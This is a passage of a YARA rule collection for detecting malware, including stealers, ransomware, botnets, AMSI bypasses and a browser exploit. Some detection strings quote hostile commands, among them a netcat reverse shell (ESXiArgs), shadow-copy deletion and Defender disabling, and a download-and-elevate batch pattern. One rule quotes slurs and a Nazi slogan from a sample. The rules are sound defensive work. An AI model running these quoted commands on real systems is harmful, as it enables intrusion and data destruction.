        description               = "detects Orign Logger"
        hash_md5                  = "bd9981b13c37d3ba04e55152243b1e3e"
        hash_sha1                 = "4669160ec356a8640cef92ddbaf7247d717a3ef1"
        hash_sha256               = "595a7ea981a3948c4f387a5a6af54a70a41dd604685c72cbd2a55880c2b702ed"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "bd9981b13c37d3ba04e55152243b1e3e"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "b5c88eec-323f-46eb-b8c3-9cf5d8ca0e1f"

    strings:
        $name           = "OriginLogger" wide
        $exe            = "OriginLogger.exe" wide
        $cfg_section_0  = "[LOGSETTINGS]"
        $cfg_section_1  = "[ASSEMBLY]"
        $cfg_section_2  = "[STEALER]"
        $cfg_section_3  = "[BINDER]"
        $cfg_section_4  = "[INSTALLATION]"
        $cfg_section_5  = "[OPTIONS]"
        $cfg_section_6  = "[DOWNLOADER]"
        $cfg_section_7  = "[EXTENSION]"
        $cfg_section_8  = "[FILEPUMPER]"
        $cfg_section_9  = "[FAKEMSG]"
        $cfg_section_10 = "[HOST]"
        $cfg_section_11 = "[BUILD]"
        $cfg_entries_0  = "BinderON="
        $cfg_entries_1  = "blackhawk="
        $cfg_entries_2  = "centbrowser="
        $cfg_entries_3  = "chedot="
        $cfg_entries_4  = "citrio="
        $cfg_entries_5  = "clawsmail="
        $cfg_entries_6  = "CloneON="
        $cfg_entries_7  = "coccoc="
        $cfg_entries_8  = "Coolnovo="
        $cfg_entries_9  = "coowon="
        $cfg_entries_10 = "cyberfox="
        $cfg_entries_11 = "Delaysec="
        $cfg_entries_12 = "dest_date="
        $cfg_entries_13 = "Disablecp="
        $cfg_entries_14 = "Disablemsconfig="
        $cfg_entries_15 = "Disablesysrestore="
        $cfg_entries_16 = "DownloaderON="
        $cfg_entries_17 = "emclient="
        $cfg_entries_18 = "epicpb="
        $cfg_entries_19 = "estensionON="
        $cfg_entries_20 = "Eudora="
        $cfg_entries_21 = "falkon="
        $cfg_entries_22 = "FileassemblyON="
        $cfg_entries_23 = "FlashFXP="
        $cfg_entries_24 = "FPRadiobut="
        $cfg_entries_25 = "HostON="
        $cfg_entries_26 = "icecat="
        $cfg_entries_27 = "icedragon="
        $cfg_entries_28 = "IconON="
        $cfg_entries_29 = "IncrediMail="
        $cfg_entries_30 = "iridium="
        $cfg_entries_31 = "JustOne="
        $cfg_entries_32 = "kmeleon="
        $cfg_entries_33 = "kometa="
        $cfg_entries_34 = "liebao="
        $cfg_entries_35 = "orbitum="
        $cfg_entries_36 = "palemoon="
        $cfg_entries_37 = "pumderON="
        $cfg_entries_38 = "pumpertext="
        $cfg_entries_39 = "qqbrowser="
        $cfg_entries_40 = "screeninterval="
        $cfg_entries_41 = "SelectFolder="
        $cfg_entries_42 = "sleipnir="
        $cfg_entries_43 = "SmartLogger="
        $cfg_entries_44 = "smartLoggerType="
        $cfg_entries_45 = "SmartWords="
        $cfg_entries_46 = "sputnik="
        $cfg_entries_47 = "telegram_api="
        $cfg_entries_48 = "telegram_chatid="
        $cfg_entries_49 = "toemail="
        $cfg_entries_50 = "trillian="
        $cfg_entries_51 = "UCBrowser="
        $cfg_entries_52 = "USBSpread="
        $cfg_entries_53 = "vivaldi="
        $cfg_entries_54 = "waterfox="
        $cfg_entries_55 = "WebFilterON="

    condition:
        uint16(0) == 0x5A4D and
        (#name >= 4 or #exe >= 2) and
        10 of ($cfg_section_*)  and
        50 of ($cfg_entries_*)
    }


// ===== Source: yaraify-rules/botnet_Kaiten.yar =====
rule botnet_Kaiten {
    meta:
        author = "NDA0E"
        date = "2024-07-22"
	description = "Kaiten botnet"
        yarahub_uuid = "fb12c1fb-e14d-48b4-ac9c-995d3b263be2"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "6dde652b28f73f978e834412b835a740"
    strings:
	$KaitenBotnet = "KaitenBotnet" ascii
    condition: 
	uint16(0) == 0x457f and all of them
}


// ===== Source: yaraify-rules/EXE_Ransomware_Mimic.yar =====
rule EXE_Ransomware_Mimic
{
    meta:
        author = "Yashraj Solanki - Cyber Threat Intelligence Analyst at Bridewell"
        description = "Detects Mimic ransomware samples based on the strings matched"
        source = "https://www.securonix.com/blog/securonix-threat-research-security-advisory-new-returgence-attack-campaign-turkish-hackers-target-mssql-servers-to-deliver-domain-wide-mimic-ransomware/"
        hash = "d6cd0080d401be8a91a55b006795701680073df8cd7a0b5bc54e314370549dc4"
        date = "2024-01-17"
        yarahub_author_twitter = "@RustyNoob619"
        yarahub_reference_md5 = "98e9fd3bcd9e94f5a8b2566c9dcf97d2"
        yarahub_uuid = "ef2757d5-267a-4d4e-92c3-9bbfb56b8e76"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        malpedia_family = "win.mimic"
    strings:
        $str1 = "MIMIC_LOG.txt" wide 
        $str2 = "mimicfile" wide
        $str3 = "Mimic" wide
        $crpt1 = "crypto\\evp\\evp_key.c" 
        $crpt2 = "crypto\\x509v3\\v3_conf.c" 
        $crpt3 = "EVP_EncryptUpdate" 
        $crpt4 = "EVP_EncryptFinal_ex" 
        $cmd1 = "Delete Shadow Copies" wide
        $cmd2 = "Loading hidden partitions" wide  
        $cmd3 = "SELECT * FROM Win32_ShadowCopy" wide  
        $cmd4 = "Attempt to unlock file" wide  
        $cmd5 = "SetPrivilege" wide  
        $cmd6 = "ClearBackup" wide  
        $cmd7 = "ConsentPromptBehaviorAdmin" wide 
        
    condition:
        uint16(0) == 0x5A4D
        and all of ($str*) 
        and 2 of ($crpt*) 
        and 4 of ($cmd*)
}


// ===== Source: yaraify-rules/AteraAgent_RemoteAdmin_April_2024.yar =====
rule AteraAgent_RemoteAdmin_April_2024 {
    meta:
        author = "NDA0"
        date = "2024-04-16"
        description = "Detects AteraAgent Remote Admin Tool"
        yarahub_uuid = "0a9aaf26-0d26-41a2-853b-08cdde61306d"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "4786b508296d522bde9b35893599f677"
    strings:
	$AteraAgent1 = "AteraAgent.exe" ascii
	$config = "AteraAgent.exe.config" ascii
	$AteraAgentInstaller = "This installer database contains the logic and data required to install AteraAgent" ascii
	$AteraAgent2 = "AteraAgent" ascii
	$AteraNetworks = "Atera networks" ascii
	$TARGETDIR = "TARGETDIRAteraAgent.exe" ascii
	$INSTALLFOLDER = "INSTALLFOLDERAteraAgent.exe.config" ascii
	$Signature = "Atera Networks Ltd" ascii
    condition:
        $AteraAgent1 and $config and $AteraAgentInstaller and $AteraAgent2 and any of them
}


// ===== Source: yaraify-rules/LucaStealer.yar =====
rule LucaStealer {


   meta:
 
        author = "Chat3ux" 
        date = "2022-09-08" 
        yarahub_reference_md5 = "c73c38662b7283befc65c87a2d82ac94" 
        yarahub_uuid = "71c9c97e-161a-41c8-8014-4ee186c92a22" 
        yarahub_license = "CC0 1.0" 
        yarahub_author_twitter = "@Chat3ux_" 
        yarahub_rule_matching_tlp = "TLP:WHITE" 
        yarahub_rule_sharing_tlp = "TLP:WHITE"  
        description = "Lucasstealer"

   strings:

      $s1 = "passwords.txt" ascii wide
      $s2 = "cookies" ascii wide
      $s3 = "telegram" ascii wide
      $s4 = "sensfiles.zip" ascii wide
      $s5 = "screen-.png" ascii wide
      $s6 = "system_info.txt" ascii wide
      $s7 = "out.zip" ascii wide
      $s8 = "info.txt" ascii wide
      $s9 = "system_info.txt"
      $s11 = "dimp.sts"
      $s12 = "Credit Cards:"
      $s13 = "Wallets:"

   condition:
   ( 6 of ($s*) )
}


// ===== Source: yaraify-rules/SUSP_ZIP_LNK_PhishAttachment.yar =====
rule SUSP_ZIP_LNK_PhishAttachment {
    meta:
        description = "Detects suspicius tiny ZIP files with malicious lnk files"
        author = "ignacior"
        reference = "Internal Research"
        date = "2022-06-23"
        score = 50
        yarahub_uuid = "fbb7c8e8-55b6-4192-877b-3dbaad76e12e"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "a457d941f930f29840dc8219796e35bd"
    strings:
        $sl1 = ".lnk"
    condition:
		uint16(0) == 0x4b50 and filesize < 2KB and $sl1 in (filesize-256..filesize)
}


// ===== Source: yaraify-rules/AMSIbypass_CLR_DLL.yar =====
rule AMSIbypass_CLR_DLL{
    meta:
        id = "bf2ed8ea-db94-4025-a5d2-f65674acb8d9"
        yarahub_uuid = "c9c67fce-ff79-4e4b-a74d-b05b4b8ec78c"
        yarahub_license = "CC0 1.0"
        version = "1.0"
        malware = "Generic AMSI bypass"
        description = "AMSI bypass CLR. https://practicalsecurityanalytics.com/new-amsi-bypss-technique-modifying-clr-dll-in-memory/"
        yarahub_reference_link = "https://practicalsecurityanalytics.com/new-amsi-bypss-technique-modifying-clr-dll-in-memory/"
        source = "Sekoia.io"
        creation_date = "2025-02-28"
        date = "2025-02-28"
        classification = "TLP:WHITE"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        hash = "cd6f4fc883d86f2411809b3116629a9ef0a9f624acc31c7786db9f71dc07e5a0"
        yarahub_reference_md5 = "b30355dea8f4bcb58ac0fec0e4e1b72d"
    strings:
        $ = "EndsWith(\"clr.dll\"" ascii 
        $ = "$PAGE_READONLY = 0x02" ascii
        $ = "$PAGE_READWRITE = 0x04" ascii
        $ = "$PAGE_EXECUTE_READWRITE = 0x40" ascii
        $ = "$PAGE_EXECUTE_READ = 0x20" ascii
        $ = "$PAGE_GUARD = 0x100" ascii
        $ = "$MEM_COMMIT = 0x1000" ascii
        $ = "$MAX_PATH = 260" ascii
    condition:
        all of them
}


// ===== Source: yaraify-rules/BAT_DbatLoader.yar =====
rule BAT_DbatLoader {
    meta:
        author = "NDA0E"
        yarahub_author_twitter = "@NDA0E"
        date = "2024-07-25"
        description = "Detects base64 and hex encoded MZ header used by DbatLoader"
        yarahub_uuid = "0ebcf373-d592-4d54-9eec-bbd15f4958e9"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "a7ecf2d80475a31c10bfdddd8c060548"
        malpedia_family = "win.dbatloader"

    strings:
        $x509_crl_begin = "-----BEGIN X509 CRL-----" ascii
        $mz = "NGQ1YTUwMDAwMjAwMDAwMDA0MDAwZjAwZmZmZjAwMDBiODAwMDAwMDAwMDAwMDAw" ascii //base64 and hex encoded MZ header
        $x509_crl_end = "-----END X509 CRL-----" ascii
    condition: 
        all of them
}


// ===== Source: yaraify-rules/Detect_Malicious_Python_Decompress_Exec.yar =====
rule Detect_Malicious_Python_Decompress_Exec {
    meta:
        description = "Detects malicious Python scripts with obfuscated zlib decompression and execution logic"
        author = "Sn0wFr0$t"
        reference = "Custom rule for obfuscated Python script detection"
        severity = "high"
		date = "2024-11-16"
		yarahub_uuid = "30413a55-c9cd-4b51-8944-1aec8eb95e66"
		yarahub_license = "CC0 1.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_reference_md5 = "b4916289881a8d13ad5230738bad3a6a"

    strings:
        $obfuscated_code = "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)("

    condition:
        $obfuscated_code
}


// ===== Source: yaraify-rules/LummaInjector.yar =====
rule LummaInjector {
    meta:
        author = "NDA0E"
        yarahub_author_twitter = "@NDA0E"
        date = "2024-08-18"
        description = "Detects LummaStealer injection into RegAsm.exe"
        yarahub_uuid = "c83b2373-4119-4a06-8c0b-af56a79e4f46"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "106317cd019b63fde3dc44b2e365d0e6"
        malpedia_family = "win.lumma"

    strings:
        $RegAsmPath = "QzpcXFdpbmRvd3NcXE1pY3Jvc29mdC5ORVRcXEZyYW1ld29ya1xcdjQuMC4zMDMxOVxcUmVnQXNtLmV4ZQ" wide ascii //Base64 encoded path to RegAsm.exe
        
        $CreateProcess = "CreateProcess" ascii // Spawns RegAsm.exe
        $VirtualAllocEx = "VirtualAllocEx" ascii // Allocate memory in RegAsm.exe
        $WriteProcess = "WriteProcessMemory" ascii // Injects into RegAsm.exe
        
    condition:
        all of them and
        uint16(0) == 0x5a4d
}


// ===== Source: yaraify-rules/EXE_Ransomware_Nevada_Feb2024.yar =====
rule EXE_Ransomware_Nevada_Feb2024 {
    meta:
        Description = "Detects Nevada ransomware aka Nokoyawa ransomware 2.1"
        author = "Yashraj Solanki - Cyber Threat Intelligence Analyst at Bridewell"
        Reference = "https://www.zscaler.com/blogs/security-research/nevada-ransomware-yet-another-nokoyawa-variant"
        Hash = "855f411bd0667b650c4f2fd3c9fbb4fa9209cf40b0d655fa9304dcdd956e0808"
        date = "2024-02-06"
        yarahub_author_twitter = "@RustyNoob619"
        yarahub_reference_md5 = "99549bcea63af5f81b01decf427519af"
        yarahub_uuid = "99b37e62-5c57-4656-9342-48fe46f4b368"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        malpedia_family = "win.nevada"

    strings:
        $rust1 = "RustBacktraceMutex"
        $rust2 = "RUST_BACKTRACE=full"
        $rust3 = "/rustc/4b91a6ea7258a947e59c6522cd5898e7c0a6a88f"

        $nevada1 = "nevada_locker"
        $nevada2 = "nevadaServiceSYSTEM"
        $nevada3 = "NEVADA.Failed to rename file"

        $ransom1 = "ntuser.exe.ini.dll.url.lnk.scr"
        $ransom2 = "drop of the panic payload panicked"
        $ransom3 = "Shadow copies deleted from"
        $ransom4 = "Failed to create ransom note"

        $s1 = "R3JlZXRpbmdzISBZb3VyIGZpbGVzIHdlcmUgc3RvbGVuIGFuZCBlbmNyeXB0ZWQ" //Greetings! Your files were stolen and encrypted
        $s2 = "C:\\Users\\user\\Desktop\\new\\nevada_locker\\target\\release\\deps\\nevada.pdb"
        
    condition:
        uint16be(0) == 0x4D5A
        and 2 of ($rust*)
        and 2 of ($ransom*)
        and (1 of ($s*) or 1 of ($nevada*))
 }


// ===== Source: yaraify-rules/Runtime_Broker_Variant_1.yar =====
rule Runtime_Broker_Variant_1 {
   meta:
      description = "Detecting malicious Runtime Broker"
      author = "Sn0wFr0$t"
      date = "2025-06-01"
      yarahub_uuid = "2de96c5f-876b-4ebb-b7a3-60900c6dab62"
      yarahub_license = "CC0 1.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
      yarahub_reference_md5 = "1450d7c122652115ef52febfa9e59349"
   strings:
      $s1 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide
      $s2 = "!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->" fullword ascii
      $s3 = "mscordaccore.dll" fullword wide
      $s4 = "Runtime Broker.dll" fullword wide 
      $s5 = "D:\\a\\_work\\1\\s\\artifacts\\obj\\coreclr\\windows.x64.Release\\dlls\\mscordac\\mscordaccore.pdb" fullword ascii 
      $s6 = "Runtime Broker - Windows NT Mode" fullword wide 
      $s7 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii 
      $s8 = "ni.dll" fullword wide 
      $s9 = "        <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii 
      $s10 = "PROCESSOR_COUNT" fullword wide 
      $s11 = "Nhttp://www.microsoft.com/pkiops/crl/Microsoft%20Time-Stamp%20PCA%202010(1).crl0l" fullword ascii
      $s12 = "Phttp://www.microsoft.com/pkiops/certs/Microsoft%20Time-Stamp%20PCA%202010(1).crt0" fullword ascii 
      $s13 = "!-- Windows 7 -->" fullword ascii 
      $s14 = "!-- Windows Vista -->" fullword ascii
      $s15 = "      \"Microsoft.Extensions.DependencyInjection.VerifyOpenGenericServiceTrimmability\": true," fullword ascii
      $s16 = "!-- Windows 8 -->" fullword ascii
      $s17 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii
      $s18 = "!-- Windows 10 -->" fullword ascii
      $s19 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii
      $s20 = "longPathAware xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">true</longPathAware>" fullword ascii
      
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}


// ===== Source: yaraify-rules/CVE_2026_2441_FontFeatureValues_UAF.yar =====
rule CVE_2026_2441_FontFeatureValues_UAF
{
    meta:
        author = "sec_toolkit"
        description = "Detects HTML/JS exploiting CVE-2026-2441: CSSFontFeatureValuesMap iterator invalidation UAF in Chrome < 145.0.7632.75. The exploit combines CSS @font-feature-values rules with JavaScript that iterates and mutates the styleset map simultaneously, causing HashMap reallocation and heap corruption leading to RCE inside sandbox."
        severity = "critical"
        cve = "CVE-2026-2441"
        cwe = "CWE-416"
        reference = "https://chromereleases.googleblog.com/2026/02/stable-channel-update-for-desktop_13.html"

        // YARAify / YARAhub required metadata
        date = "2026-02-17"
        yarahub_uuid = "5443f372-24b8-4281-be98-d2a9a480ff19"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "ac1947bd6d33ac9291a9d1a18a96dba9"

    strings:
        // === CSS TRIGGER: @font-feature-values at-rule ===
        $css_ffv = "@font-feature-values" ascii nocase

        // === CSS FEATURE BLOCKS (at least one needed to populate the map) ===
        $css_block1 = "@styleset" ascii nocase
        $css_block2 = "@stylistic" ascii nocase
        $css_block3 = "@swash" ascii nocase
        $css_block4 = "@ornaments" ascii nocase
        $css_block5 = "@annotation" ascii nocase
        $css_block6 = "@character-variant" ascii nocase

        // === JS MAP ACCESS: getting the CSSFontFeatureValuesMap object ===
        $js_map1 = ".styleset" ascii
        $js_map2 = ".stylistic" ascii
        $js_map3 = ".swash" ascii
        $js_map4 = ".ornaments" ascii
        $js_map5 = ".annotation" ascii
        $js_map6 = ".characterVariant" ascii

        // === JS ITERATOR CREATION ===
        $js_iter1 = ".entries()" ascii
        $js_iter2 = ".keys()" ascii
        $js_iter3 = ".values()" ascii
        $js_iter4 = ".forEach(" ascii
        $js_iter5 = "for (const" ascii
        $js_iter6 = "for (let" ascii
        $js_iter7 = "for (var" ascii
        $js_iter8 = ".next()" ascii

        // === JS MAP MUTATION (the actual trigger) ===
        $js_mutate1 = ".delete(" ascii
        $js_mutate2 = ".set(" ascii
        $js_mutate3 = ".clear()" ascii

        // === BONUS: cssRules access pattern (alternative trigger path) ===
        $js_rules1 = "cssRules" ascii
        $js_rules2 = "styleSheets" ascii
        $js_rules3 = "font-feature-values" ascii

    condition:
        filesize < 5MB and
        (
            // PRIMARY: CSS @font-feature-values + JS map access + iterator + mutation
            (
                $css_ffv and
                1 of ($css_block*) and
                1 of ($js_map*) and
                1 of ($js_iter*) and
                1 of ($js_mutate*)
            )
            or
            // SECONDARY: CSS trigger + cssRules access + map access + mutation
            (
                $css_ffv and
                1 of ($js_rules*) and
                1 of ($js_map*) and
                1 of ($js_mutate*)
            )
            or
            // TERTIARY: cssRules + font-feature-values string + iterator + mutation
            (
                $js_rules1 and
                $js_rules3 and
                1 of ($js_map*) and
                1 of ($js_iter*) and
                1 of ($js_mutate*)
            )
        )
}


// ===== Source: yaraify-rules/BatModifier2.yar =====
rule BatModifier2
{
    meta:
        author = "Madhav"
        description = "This is a bat file which is setup a game. 49509"
        date = "2025-05-10"
	yarahub_reference_md5 = "79a546f11d5ed65736735ba86cb95213"
	yarahub_uuid = "a4df6953-1e6f-488f-92c7-e06ab56ca848"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
    
    strings:
        $mal1 = "PowerShell -Command \"Start-Process '%~f0' -Verb runAs\""
        $mal2 = "net session"
        $mal3 = "powershell -Command \"Invoke-WebRequest -Uri"
        $mal4 = "%SystemRoot%\\System32\\drivers\\etc\\hosts"
        $mal5 = "netsh advfirewall firewall add rule"
        $mal6 = "dir=out action=block remoteip="
	$mal7 = "%SystemRoot%\\System32\\curl.exe"
	$mal8 = "shell \"su -c 'id'\" | find \"uid=0(root)\""
	$mal9 = "tinyurl.com"
	$mal10 = "TaskKill /F /IM"
	$mal11 = "reg delete"
	$mal12 = "rd /s /q"
	$mal13 = "rd /q /s"
	$mal14 = "copy /y"
	$mal15 = "del /f"
	$mal16 = "del /s"
	$mal17 = "del /q"
    
    condition:
        5 of ($mal*)
}


// ===== Source: yaraify-rules/RANSOM_ESXiArgs_Ransomware_Python_Feb23.yar =====
rule RANSOM_ESXiArgs_Ransomware_Python_Feb23
{
    meta:
	author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
	description = "Detects the ESXiArgs Ransomware encryption python script"
	reference = "https://www.secuinfra.com/en/techtalk/hide-your-hypervisor-analysis-of-esxiargs-ransomware/"
	date = "2023-02-07"
	tlp = "CLEAR"
	yarahub_reference_md5 = "c358fe0e8837cc577315fc38892b937d"
	yarahub_uuid = "e79d0764-bf61-4e71-b181-8ed13edfcb98"
	yarahub_license = "CC BY 4.0"
	yarahub_rule_matching_tlp = "TLP:WHITE"
	yarahub_rule_sharing_tlp = "TLP:WHITE"
	yarahub_author_twitter = "@SI_FalconTeam"

    strings:
	$python = "#!/bin/python"
	$desc = "This module starts debug tools"

	$command0 = "server_namespace"
	$command1 = "service_instance"
	$command2 = "local"
	$command3 = "operation_id"
	$command4 = "envelope"

	$cmd = "'mkfifo /tmp/tmpy_8th_nb; cat /tmp/tmpy_8th_nb | /bin/sh -i 2>&1 | nc %s %s > /tmp/tmpy_8th_nb' % (host, port)"
	$OpenSLPPort = "port = '427'"
	$listener = "HTTPServer(('127.0.0.1', 8008), PostServer).serve_forever()"

    condition:
	$python
	and $desc
	and 4 of ($command*)
	and $cmd
	and $OpenSLPPort
	and $listener
}


// ===== Source: yaraify-rules/GreenBloodRansomware_vt.yar =====
rule GreenBloodRansomware_vt : Ransomware
{
  meta:
    description = "Detects GreenBlood ransomware family"
    author = "Valton Tahiri"
    reference = "https://www.linkedin.com/in/valton-tahiri/"
    date = "2026-02-12"

    /* --- YARAify / YARAhub required fields --- */
    yarahub_uuid = "2d4f6f51-4f6a-4d21-9d2e-9b9c1f5e7a6b"
    yarahub_license = "CC0 1.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"
    yarahub_reference_md5 = "12bba7161d07efcb1b14d30054901ac9"

    /* extra context */
    category = "ransomware"
    malware_family = "GreenBlood"
    severity = "critical"
    tlp = "TLP:WHITE"

  strings:
    /* unique identifiers */
    $email   = "thegreenblood@proton.me" ascii wide nocase
    $banner  = "TH3 GR33N BL00D GR0UP" ascii wide
    $encpp   = "enc++" ascii wide
    $note1   = "ALL YOUR FILES HAVE BEEN ENCRYPTED!" ascii wide
    $note2   = "DO NOT ATTEMPT TO DECRYPT FILES YOURSELF!" ascii wide
    $subid   = "DAF-SN-" ascii wide
    $cleanup = "cleanup_greenblood.bat" ascii wide nocase

    /* destructive behavior (only counted in combination) */
    $vss     = "vssadmin delete shadows /all /quiet" ascii wide nocase
    $defkey  = "Windows Defender\\Real-Time Protection" ascii wide
    $rtm     = "DisableRealtimeMonitoring" ascii wide

  condition:
    ($email or $banner) and
    (2 of ($encpp,$note1,$note2,$subid,$cleanup,$vss,$rtm,$defkey))
}


// ===== Source: yaraify-rules/XWorm_3_0_3_1_Detection2.yar =====
rule XWorm_3_0_3_1_Detection2 {
    meta:
	yarahub_uuid = "687740d6-e1b9-4284-878b-93a888db382d"
	yarahub_license = "CC0 1.0"
	yarahub_rule_matching_tlp = "TLP:WHITE"
	yarahub_rule_sharing_tlp = "TLP:WHITE"
	yarahub_reference_md5 = "1b80b6637f49a08fbedbed6f7a80584f"
        author = "Archevod11"
        description = "Detects XWorm versions 3.0 and 3.1 - New"
        version = "1.0"
        date = "2024-06-17"
        malware_family = "XWorm"

    strings:
        // Strings unique to XWorm 3.0 and 3.1
        $version_3_0 = "XWorm 3.0" wide ascii
        $version_3_1 = "XWorm 3.1" wide ascii

    condition:
        // Match if any version-specific strings are found
        any of ($version_3_0, $version_3_1)
}


// ===== Source: yaraify-rules/Android_Backdoor_Xamalicious.yar =====
rule Android_Backdoor_Xamalicious
{
    meta:
        description = "Detects Xamalicious Android malware samples based on the strings matched"
        author = "Yashraj Solanki - Cyber Threat Intelligence Analyst at Bridewell"
        source = "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/stealth-backdoor-android-xamalicious-actively-infecting-devices/"
        hash = "7149acb072fe3dcf4dcc6524be68bd76a9a2896e125ff2dddefb32a4357f47f6"
        date = "2024-01-26"
        yarahub_author_twitter = "@RustyNoob619"
        yarahub_reference_md5 = "76100929a9bad1da1d9421a91980a4b3"
        yarahub_uuid = "927341a0-9103-482a-9a95-10cbb6c7ae23"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"

    strings:
        $anrd = "AndroidManifest.xml"

        $xa1 = "xamarin_essentials_fileprovider_file_paths" 
        $xa2 = "Xamarin.Android v9.0 Support"
        $xa3 = "Xamarin.Android.Build.Tasks"
        $xa4 = "Xamarin.Forms.Platform.Android"
        $xa5 = "Xamarin.Android v7.0 Support"
        $xa6 = "Xamarin.Forms"
        $xa7 = "com.xamarin.formsviewgroup" nocase
        $xa9 = "com/xamarin/formsviewgroup/BuildConfig"
        $xa10 = "Xamarin.Essentials"

        $mcrf1 = "Microsoft.AspNetCore.Http.HttpResponse"
        $mcrf2 = "Microsoft.AspNetCore.Http.HttpRequest"
        $mcrf3 = "Microsoft.AspNetCore.Http.HttpContext"
        $mcrf4 = "Microsoft.AspNetCore.Builder.IApplicationBuilder"

        $microsoft = "Microsoft"

        $per1 = "android.permission.BIND_JOB_SERVICET"
        $per2 = "android.permission.WRITE_EXTERNAL_STORAGE"
        $per3 = "android.permission.INTERNET"

        $wid1 = "Xamarin.Android bindings for Android Support Library - runtime" wide
        $wid2 = "Xamarin.Android.Arch.Core.Runtime" wide
        $wid3 = "Xamarin.Android.Arch.Core.Runtime.dll" wide

        $wide1 = "com/xamarin/forms/platform/android/FormsViewGroup" wide
        $wide2 = "com/xamarin/forms/platform/android" wide
        $wide3 = "com/xamarin/formsviewgroup/BuildConfig" wide
        $wide4 = "com.xamarin.formsviewgroup" wide 
    
        $int1 = "android.hardware.display.category.PRESENTATION" wide
        $int2 = "android.intent.category.LEANBACK_LAUNCHER" wide
        $int3 = "android.intent.extra.HTML_TEXT" wide
        $int4 = "android.intent.extra.START_PLAYBACK" wide
        $int5 = "android.activity.usage_time" wide
        $int6 = "android.usage_time_packages" wide
        $int7 = "android.support.PARENT_ACTIVITY" wide

        
    condition:
        $anrd
        and 4 of ($xa*)
        and 2 of ($mcrf*) or $microsoft 
        and 1 of ($per*)
        and 2 of ($wid*)
        and 2 of ($wide*)
        and 4 of ($int*)
}


// ===== Source: yaraify-rules/Suspicious_Encoded_PS_String_20251105.yar =====
rule Suspicious_Encoded_PS_String_20251105
{
    meta:
        author       = "ShadowOpCode"
        date         = "2025-11-05"
        description  = "Detects ASCII string"
        reference    = "internally crafted rule"
        yarahub_uuid = "8b0a9b66-c3a2-4d4e-8d7d-ac7c43b1d6f8"
		yarahub_reference_md5 = "04428fba0f6c5caaffcc55dd73e911e7"
		yarahub_license = "CC0 1.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"

    strings:
        $encoded_str = "DQojIEVuY3J5cHRlZCBQb3dlclNoZWxsIFNjcmlwd" ascii

    condition:
        any of ($encoded_str)
}


// ===== Source: yaraify-rules/botnet_unknown.yar =====
rule botnet_unknown {
    meta:
        author = "NDA0E"
        date = "2024-07-22"
	description = "unknown botnet"
        yarahub_uuid = "244e449d-005a-4ecb-8db4-2c7517c094f7"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "6dde652b28f73f978e834412b835a740"
    strings:
	$j = "jay is a faggot" ascii
	$a = "add illuminate#0038 for gay sex" ascii
	$p = "pls dont patch this pls dont patch this pls dont patch this" ascii
	$d = "discord dot gg slash bddHzGgKG7" ascii
	$L = "Lb32N7BOTNETYt4WLWrWnrm0iqhijcu2N7zTH8iGFqb65w62U6RNnyikqB6Yi4PJb32TP5uQVyQRMrRMzjRB7rTPVyQR8iGFF" ascii
	$h = "All hail Hitler!" ascii
    condition: 
	uint16(0) == 0x457f and any of them
}


// ===== Source: yaraify-rules/Linux_XMR_Miner_xmra64.yar =====
rule Linux_XMR_Miner_xmra64
{
    meta:
        author = "0xFF1"
        description = "Linux XMR miner payload (xmra64) used by multi-stage cron-based droppers"
